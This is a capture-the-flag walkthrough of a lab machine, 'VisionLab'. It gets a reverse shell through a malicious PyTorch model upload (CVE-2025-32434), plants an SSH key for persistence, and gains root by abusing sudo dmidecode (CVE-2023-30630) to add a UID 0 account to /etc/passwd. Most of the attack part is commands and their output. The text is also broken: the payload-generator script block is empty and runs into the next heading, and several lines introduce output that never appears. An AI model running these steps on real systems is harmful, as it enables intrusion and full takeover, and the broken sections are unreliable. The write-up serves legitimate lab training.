# 🌐 Web Enumeration

Open port `8000` in the browser.

<img width="1918" height="859" alt="Screenshot_2026-08-16_09_25_08" src="https://github.com/user-attachments/assets/5cee250c-efbc-4ab3-aa58-ab55c62b6ae9" />

The website identifies itself as:

```text
VisionLab — Object Detection
```

The application provides an **AI-powered Object Detection Workspace**.

It allows users to:

- Upload an image
- Upload a custom PyTorch model
- Analyze the uploaded image using the selected model

This functionality is particularly interesting because PyTorch's `torch.load()` can deserialize serialized model data. 
Researching the PyTorch version and model-loading behavior points to **CVE-2025-32434**, a critical remote code execution vulnerability affecting PyTorch versions prior to `2.6.0`.

# 🧠 PyTorch Model Upload

Returning to the main application reveals that the server allows users to upload a custom PyTorch model.

This functionality is potentially dangerous if the application loads untrusted model files using Python deserialization.

The attack is based on a malicious serialized Python object whose `__reduce__()` method causes `os.system()` to execute when the object is deserialized.

---

# 🐚 Malicious PyTorch Payload

Create a Python script named:

```text
make_payload.py
```

The payload generator is:

```python

# 🧪 Generate the Malicious Model

Generate the malicious PyTorch checkpoint with the attacker IP and listener port.

```bash
python3 make_payload.py --lhost 192.168.1.2 --lport 4444 -o malicious.pt
```

## Result

```text
$ python3 make_payload.py --lhost 192.168.1.2 --lport 4444 -o malicious.pt
[+] wrote malicious.pt  (variant=bash)
```

The malicious model is now created:

---

# 📡 Start the Reverse Shell Listener

Start a Netcat listener on the attacker machine.

```bash
nc -lnvp 4444
```

Then return to the VisionLab application.

<img width="1918" height="782" alt="Screenshot_2026-08-18_10_57_44" src="https://github.com/user-attachments/assets/719aa521-e202-4dad-963a-6f166c91dfde" />

Upload:

1. Any image
2. The generated `malicious.pt` model

Then select:

```text
Analyze Image
```

When the server loads the malicious model, the serialized payload executes.

---

# 🐚 Initial Shell

The listener receives a connection from the target.

```text
listening on [any] 4444 ...
connect to [192.168.1.2] from (UNKNOWN) [192.168.1.50] 57292
bash: no se puede establecer el grupo de proceso de terminal (1383): Función ioctl no apropiada para el dispositivo
bash: no hay control de trabajos en este shell

vision@VisionLab:~$
```

We successfully obtain a shell as:

```text
vision
```

---

# 🏁 User Flag

Read the user flag.

```bash
cat /home/vision/user-48Jj1Lw.txt
```

## Result

```text
f654b2849e638c52cdb826646476c2d0
```

---

# 🔍 Initial Privilege Escalation Check

Check the available sudo permissions.

```bash
sudo -l
```

## Result

```text
vision@VisionLab:~$ sudo -l
sudo: The "no new privileges" flag is set, which prevents sudo from running as root.
sudo: If sudo is running in a container, you may need to adjust the container configuration to disable the flag.
vision@VisionLab:~$ 
```

The current shell has the `no new privileges` security flag set, preventing normal sudo execution.

Therefore, another method is required.

---

# 🔑 SSH Key Persistence

Generate an SSH key pair from the `vision` account.

```bash
ssh-keygen
```

Accept the default location:

```text

vision@VisionLab:~/.ssh$ ssh-keygen
Generating public/private ed25519 key pair.
Enter file in which to save the key (/home/vision/.ssh/id_ed25519): 
Enter passphrase for "/home/vision/.ssh/id_ed25519" (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/vision/.ssh/id_ed25519
Your public key has been saved in /home/vision/.ssh/id_ed25519.pub
The key fingerprint is:
SHA256:/+VsJvU5Vfs1mxzRP8N2N0f0G4uJ7VVLlZgcC+NtAu4 vision@VisionLab
The key's randomart image is:
+--[ED25519 256]--+
|         . o..+ .|
|        . o ++..o|
|         . o + .+|
|        .   o  +*|
|        SE  o =.@|
|         . . +.#B|
|          . ..=.^|
|           ..=o*o|
|            .+o .|
+----[SHA256]-----+
vision@VisionLab:~/.ssh$ ls
id_ed25519  id_ed25519.pub
```

Leave the passphrase empty.

The key pair is created:

Copy the public key into `authorized_keys`.

```bash
cp id_ed25519.pub authorized_keys
```

The private key must then be transferred to the attacker machine.

On the attacker machine, restrict the private-key permissions:

```bash
chmod 600 id_ed25519
```

---

# 🔐 SSH Access

Use the private key to establish a normal SSH session.

```bash
ssh -i id_ed25519 vision@192.168.1.50
```

The SSH session is successfully established as `vision`.

```text
$ ssh -i id_ed25519 vision@192.168.1.50
Linux VisionLab 6.12.96+deb13-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.12.96-1 (2026-07-20) x86_64

```

This provides a normal SSH session without the previous `no new privileges` restriction.

---

# 🔍 Sudo Enumeration

Check sudo permissions again.

```bash
sudo -l
```

## Result

```text
vision@VisionLab:~$ sudo -l
Matching Defaults entries for vision on VisionLab:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User vision may run the following commands on VisionLab:
    (ALL) NOPASSWD: /usr/sbin/dmidecode
vision@VisionLab:~$ 
```

The important finding is:

```text
(ALL) NOPASSWD: /usr/sbin/dmidecode
```

The `vision` user can execute `/usr/sbin/dmidecode` as root without a password.

---

# 💥 dmidecode Privilege Escalation

Research into the allowed binary reveals that the installed `dmidecode` version is vulnerable to:

```text
CVE-2023-30630
```

The vulnerability can be abused to write data using the `--dump-bin` functionality when combined with a crafted DMI file.

A tool called `dmiwrite` can be used to create the required malicious DMI file.

Clone the repository:

```bash
git clone https://github.com/adamreiser/dmiwrite.git
```

Move into the directory:

```bash
cd dmiwrite
```

Compile the tool:

```bash
make dmiwrite
```

---

# 📝 Create the Malicious `/etc/passwd` Payload

Copy the existing `/etc/passwd` file into a payload file.

```bash
cp /etc/passwd payload.in
```

Append a new account with UID `0` and GID `0`.

```bash
echo "zer0arc4::x:0:0:root:/root:/bin/bash" >> payload.in
```

The important portion is:

```text
zer0arc4::x:0:0:root:/root:/bin/bash
```

The account is configured with:

```text
UID = 0
GID = 0
Home = /root
Shell = /bin/bash
```

UID `0` corresponds to the root account.

---

# 🧬 Generate the Malicious DMI File

Use `dmiwrite` to generate the crafted DMI file.

```bash
./dmiwrite payload.in evil.dmi
```

## Result

```text
vision@VisionLab:~/dmiwrite$ ./dmiwrite payload.in evil.dmi
Wrote payload of length 1266 to evil.dmi
Padding 981774 bytes to evil.dmi
        Setting checksum: memset(buf+30, 113, 1);

Wrote DMI header of length 32 to evil.dmi
Padding 65536 bytes to evil.dmi
Congratulations, evil.dmi looks like a valid DMI file.
```

The malicious DMI file is successfully generated:

```text
evil.dmi
```

---

# ⬆️ Exploit dmidecode

Execute `dmidecode` through sudo using the crafted DMI file.

```bash
sudo /usr/sbin/dmidecode --no-sysfs -d evil.dmi --dump-bin /etc/passwd
```

## Result

```text
vision@VisionLab:~/dmiwrite$ sudo /usr/sbin/dmidecode --no-sysfs -d evil.dmi --dump-bin /etc/passwd
# dmidecode 3.4
Scanning evil.dmi for entry point.
SMBIOS 2.1 present.
1 structures occupying 1264 bytes.
Table at 0x00000000.

# Writing 1264 bytes to /etc/passwd.
# Writing 0 bytes to /etc/passwd.
```

Although the command displays an error at the end, the crafted payload has modified `/etc/passwd`.

---

# 👑 Root Access

The newly created account has UID `0`, meaning it has root privileges.

Switch to the newly created account:

```bash
su - zer0arc4
```

Verify the current identity:

```bash
id
```

## Result

```text
zer0arc4@VisionLab:/home/vision/dmiwrite# id
uid=0(zer0acr4) gid=0(root) grupos=0(root)
zer0arc4@VisionLab:/home/vision/dmiwrite#
```

The UID is `0`, confirming root-level privileges.

We have successfully escalated to root.

---

# 🏁 Root Flag

Read the root flag.

```bash
cat /root/root.txt
```

## Result

```text
14fa7405194325a89bd063b8ad30fba2
```

# 🚀 Key Takeaways

- Never deserialize untrusted Python/PyTorch objects without appropriate security controls.
- PyTorch model uploads should be treated as potentially executable content rather than ordinary data files.
- Applications that allow users to upload custom models should isolate model processing in a strongly restricted environment.
- The `no new privileges` flag prevented the initial shell from using sudo, demonstrating the value of container and process security controls.
- Moving to a normal SSH session changed the privilege-escalation situation because the `no new privileges` restriction was no longer present.
- Sudo permissions should be carefully reviewed, especially when powerful system utilities such as `dmidecode` can be executed as root.
- Vulnerable utilities can sometimes provide indirect write primitives that lead to complete system compromise.
- `/etc/passwd` should be protected from unauthorized modification because UID `0` represents root-level privileges.
